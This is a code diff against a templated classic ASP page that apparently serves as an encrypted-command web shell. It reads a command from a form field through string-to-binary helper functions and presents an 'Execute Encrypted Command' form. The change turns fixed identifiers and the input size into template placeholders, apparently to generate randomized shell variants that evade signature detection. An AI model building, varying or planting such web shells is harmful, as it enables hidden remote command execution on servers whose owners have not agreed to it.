@@ -23,9 +23,9 @@ If Request.Form("{{ encryptedInput }}") <> "" Then
     End Function
 
     Function {{ StringToBinary }}({{ strText }})
-        Dim arrData
-        arrData = {{ MultiByteToBinary }}({{ strText }})
-        {{ StringToBinary }} = arrData
+        Dim {{ arrData }}
+        {{ arrData }} = {{ MultiByteToBinary }}({{ strText }})
+        {{ StringToBinary }} = {{ arrData }}
     End Function
 
     Function {{ MultiByteToBinary }}({{ strText }})
@@ -105,7 +105,7 @@ End If
     <h2>{{ Execute_Encrypted_Command }}</h2>
     <form method="post">
         <label for="{{ encryptedInput }}">{{ Enter_Encrypted_Command }}</label><br>
-        <input type="text" id="{{ encryptedInput }}" name="{{ encryptedInput }}" size="60"><br><br>
+        <input type="text" id="{{ encryptedInput }}" name="{{ encryptedInput }}" size="{{ inputSize }}"><br><br>
         <input type="submit" value="{{ SubmitValue }}">
     </form>
 
